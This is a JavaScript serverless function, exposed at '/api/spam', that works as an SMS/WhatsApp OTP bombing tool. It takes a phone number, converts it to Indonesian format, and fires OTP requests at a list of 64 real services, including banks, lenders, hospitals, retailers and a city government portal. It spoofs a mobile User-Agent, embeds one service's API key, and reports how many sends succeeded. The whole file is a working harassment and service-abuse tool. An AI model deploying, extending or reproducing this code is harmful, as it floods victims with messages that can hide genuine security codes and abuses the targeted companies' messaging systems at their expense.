// Vercel Serverless Function — OTP Proxy
// POST /api/spam
// Body: { phone: "08...", targets: [1,2,3] | "all", key: "Patrick" }

const ENDPOINTS = [
  { id: 1,  name: "Tokopedia",        url: "https://accounts.tokopedia.com/otp/c/ajax/request-war", method: "POST", body: (p) => ({ msisdn: p, otp_type: "sms" }) },
  { id: 2,  name: "Matahari",         url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation", method: "POST", body: (p) => ({ phone: p }) },
  { id: 3,  name: "BRI",              url: "https://api.bri.co.id/otp/send", method: "POST", body: (p) => ({ phone: p }) },
  { id: 4,  name: "Blibli/Tiket",     url: "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate", method: "POST", body: (p) => ({ phoneNumber: p }) },
  { id: 5,  name: "Tiket.com",        url: "https://api.tiket.com", method: "POST", body: (p) => ({ phone: p }) },
  { id: 6,  name: "Traveloka",        url: "https://api.traveloka.com/v2/hotel/auth/otp", method: "POST", body: (p) => ({ phoneNumber: p }) },
  { id: 7,  name: "Kredivo",          url: "https://api.kredivo.com/v1/auth/otp/send", method: "POST", body: (p) => ({ mobile_number: p }) },
  { id: 8,  name: "Akulaku",          url: "https://api.akulaku.com/v1/auth/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 9,  name: "Kredit Pintar",    url: "https://api.kreditpintar.com/v1/auth/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 10, name: "Bank Neo",         url: "https://api.bankneo.co.id/v1/auth/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 11, name: "Adakami",          url: "https://api.adakami.co.id/v1/auth/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 12, name: "Home Credit",      url: "https://api.homecredit.co.id/v1/auth/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 13, name: "SPindo",           url: "https://api.spindo.com/v1/auth/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 14, name: "Julo",             url: "https://api.julo.co.id/v1/auth/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 15, name: "FinAccel",         url: "https://api.finaccel.co.id/v1/auth/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 16, name: "Greensm",          url: "https://api.greensm.id/v1/auth/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 17, name: "UangMe",           url: "https://api.uangme.com/api/v2/sms_code", method: "POST", body: (p) => ({ phone: p }) },
  { id: 18, name: "PinjamDuit",       url: "https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code", method: "POST", body: (p) => ({ phone: p }) },
  { id: 19, name: "Akseleran",        url: "https://api.akseleran.co.id/users/otp/request", method: "POST", body: (p) => ({ phone: p }) },
  { id: 20, name: "Maxim",            url: "https://api.maxim-application.com/v1/auth/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 21, name: "Auto2000",         url: "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 22, name: "Toyota Astra",     url: "https://dxmi.toyota.astra.co.id/api/auth/one-account/verify/resend-otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 23, name: "Astra Daihatsu",   url: "https://www.astra-daihatsu.id/otp/whatsapp/generate", method: "POST", body: (p) => ({ phone: p }) },
  { id: 24, name: "Moladin",          url: "https://moladin.com/wp-json/api/v1/request_otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 25, name: "Carro",            url: "https://carro.co/_actions/requestOtp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 26, name: "Duniagames",       url: "https://api.duniagames.co.id/api/user/api/v2/user/send-otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 27, name: "VC Gamers",        url: "https://mitra-api.vcgamers.com", method: "POST", body: (p) => ({ phone: p }) },
  { id: 28, name: "Stockbit",         url: "https://exodus.stockbit.com/registration/v4/otp/phone/send", method: "POST", body: (p) => ({ phone: p }) },
  { id: 29, name: "Vidio",            url: "https://api.vidio.com/otp/send", method: "POST", body: (p) => ({ phone: p }) },
  { id: 30, name: "Tri (3)",          url: "https://registrasi.tri.co.id/api/v1/generate-otp", method: "POST", body: (p) => ({ msisdn: p }) },
  { id: 31, name: "Alodokter",        url: "https://www.alodokter.com/login-alodokter", method: "POST", body: (p) => ({ phone: p }) },
  { id: 32, name: "Halodoc",          url: "https://www.halodoc.com/magneto-api/v1/users/passkey/", method: "POST", body: (p) => ({ phone: p }) },
  { id: 33, name: "Siloam",           url: "https://mysiloam-api.siloamhospitals.com/user/v1/auth-new/whatsapp/send-code", method: "POST", body: (p) => ({ phone: p }) },
  { id: 34, name: "Sofia",            url: "https://sofia.bmsecure.id/central-api/sc-api/otp/generate", method: "POST", body: (p) => ({ phone: p }) },
  { id: 35, name: "Beautyhaul",       url: "https://www.beautyhaul.com/account/register", method: "POST", body: (p) => ({ phone: p }) },
  { id: 36, name: "Bonus Belanja",    url: "https://www.bonusbelanja.com/api/auth/registration/app", method: "POST", body: (p) => ({ phone: p }) },
  { id: 37, name: "Pizza Hut",        url: "https://api-prod.pizzahut.co.id/customer/v1/customer/send-otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 38, name: "Eraspace",         url: "https://jeanne.eraspace.com", method: "POST", body: (p) => ({ phone: p }) },
  { id: 39, name: "Alfagift",         url: "https://webcommerce-gw.alfagift.id", method: "POST", body: (p) => ({ phone: p }) },
  { id: 40, name: "Ruparupa",         url: "https://wapi.ruparupa.com", method: "POST", body: (p) => ({ phone: p }) },
  { id: 41, name: "Pegipegi",         url: "https://www.pegipegi.com/auth/register", method: "POST", body: (p) => ({ phone: p }) },
  { id: 42, name: "Rumah123",         url: "https://www.rumah123.com/api/otp/request-otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 43, name: "Pinhome",          url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 44, name: "Internet Rakyat",  url: "https://internetrakyat.id/api/app/auth/send-otp-register", method: "POST", body: (p) => ({ phone: p }), headers: { "x-api-key": "280999!FTTH" } },
  { id: 45, name: "PlanetBan",        url: "https://api.planetban.com/website/customer/request-otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 46, name: "Paper.id",         url: "https://register.paper.id/api/v1/auth/register/send-otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 47, name: "Royal Canin",      url: "https://club.royalcanin.id/api/get_otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 48, name: "Eiger Adventure",  url: "https://www.eigeradventure.com/api/v1/app/otp/register", method: "POST", body: (p) => ({ phone: p }) },
  { id: 49, name: "Generasi Maju",    url: "https://www.generasimaju.co.id/klub-generasi-maju/auth/token/request", method: "POST", body: (p) => ({ phone: p }) },
  { id: 50, name: "Buccheri",         url: "https://member.buccheri.com/api/v1/otp-sent", method: "POST", body: (p) => ({ phone: p }) },
  { id: 51, name: "Gabino",           url: "https://member.gabino.id/api/v1/otp-sent", method: "POST", body: (p) => ({ phone: p }) },
  { id: 52, name: "Mister Aladin",    url: "https://m.misteraladin.com/api/members/v2/otp/request", method: "POST", body: (p) => ({ phone: p }) },
  { id: 53, name: "Garasi.id",        url: "https://garasi.id/api/users/register/whatsapp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 54, name: "Skul.id",          url: "https://api2.skul.id/v2/otp/request", method: "POST", body: (p) => ({ phone: p }) },
  { id: 55, name: "Yoodo",            url: "https://api.yoodo.com.my/v1/auth/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 56, name: "Fastwork",         url: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", method: "POST", body: (p) => ({ phone: p }) },
  { id: 57, name: "BisaTopup",        url: "https://bisatopup.co.id/api/auth/register/send-otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 58, name: "Tokoplas",         url: "https://api.tokoplas.com/v2/register/otp/request", method: "POST", body: (p) => ({ phone: p }) },
  { id: 59, name: "Maulagi.id",       url: "https://api.maulagi.id/api/v2/auth/check", method: "POST", body: (p) => ({ phone: p }) },
  { id: 60, name: "Minumyuk Kaka",    url: "https://minumyukkaka.com/register", method: "POST", body: (p) => ({ phone: p }) },
  { id: 61, name: "Jembatani",        url: "https://jembatani.co.id/api/register", method: "POST", body: (p) => ({ phone: p }) },
  { id: 62, name: "Sidemang",         url: "https://sidemang.palembang.go.id/api/users/register/send-otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 63, name: "BYU",              url: "https://pidaw-app.cx.byu.id/api/v3/user-service/v6/id/en-US/WEB/signin/otp", method: "POST", body: (p) => ({ phone: p }) },
  { id: 64, name: "HRS-BRE",          url: "https://career.hrs-bre.site/auth/sign_up", method: "POST", body: (p) => ({ phone: p }) }
];

const API_KEY = "Patrick";

function normalizePhone(phone) {
  let p = String(phone).replace(/\D/g, "");
  if (p.startsWith("0")) p = "62" + p.slice(1);
  if (!p.startsWith("62")) p = "62" + p;
  return p;
}

async function hitOne(ep, phone) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 8000);

  try {
    const headers = {
      "Content-Type": "application/json",
      "Accept": "application/json",
      "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
      ...(ep.headers || {})
    };

    const res = await fetch(ep.url, {
      method: ep.method || "POST",
      headers,
      body: JSON.stringify(ep.body(phone)),
      signal: controller.signal
    });

    clearTimeout(timer);
    const status = res.status;

    if (status >= 200 && status < 300) return { name: ep.name, status: "success", code: status };
    if (status === 429) return { name: ep.name, status: "rate", code: status };
    if (status >= 400 && status < 500) return { name: ep.name, status: "bad", code: status };
    return { name: ep.name, status: "error", code: status };
  } catch (err) {
    clearTimeout(timer);
    return { name: ep.name, status: "error", code: 0, msg: err.name === "AbortError" ? "timeout" : err.message };
  }
}

module.exports = async function handler(req, res) {
  // CORS
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, X-API-KEY");

  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const key = req.headers["x-api-key"] || req.body?.key || "";
  if (key !== API_KEY) {
    return res.status(401).json({ error: "Invalid API key" });
  }

  const phoneRaw = req.body?.phone;
  if (!phoneRaw) return res.status(400).json({ error: "phone required" });

  const phone = normalizePhone(phoneRaw);
  let targets = req.body?.targets;

  let list;
  if (!targets || targets === "all") {
    list = ENDPOINTS;
  } else if (Array.isArray(targets)) {
    list = ENDPOINTS.filter(e => targets.includes(e.id));
  } else {
    list = ENDPOINTS.filter(e => e.id === parseInt(targets));
  }

  if (list.length === 0) return res.status(400).json({ error: "no targets" });

  // Hit sequentially to reduce rate-limit storms (max ~15 concurrent would be better with Promise pool, keep simple)
  const results = [];
  for (const ep of list) {
    const r = await hitOne(ep, phone);
    results.push(r);
  }

  const summary = {
    success: results.filter(r => r.status === "success").length,
    rate: results.filter(r => r.status === "rate").length,
    bad: results.filter(r => r.status === "bad").length,
    error: results.filter(r => r.status === "error").length
  };

  return res.status(200).json({
    phone,
    total: results.length,
    summary,
    results
  });
};
